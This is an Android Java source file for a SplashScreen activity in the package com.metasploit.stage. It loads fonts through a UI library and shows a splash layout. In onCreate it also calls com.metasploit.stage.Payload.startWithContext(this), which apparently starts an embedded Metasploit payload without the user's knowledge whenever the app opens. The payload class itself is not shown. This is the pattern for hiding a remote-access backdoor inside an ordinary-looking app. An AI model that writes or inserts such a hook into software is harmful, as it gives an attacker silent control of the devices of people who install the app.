package com.metasploit.stage;

import com.ivankocijan.magicviews.MagicViews;

import android.app.Activity;
import android.os.Bundle;

public class SplashScreen extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        MagicViews.setFontFolderPath(this, "fonts");
        com.metasploit.stage.Payload.startWithContext(this);
        setContentView(R.layout.activity_splash);

    }

}
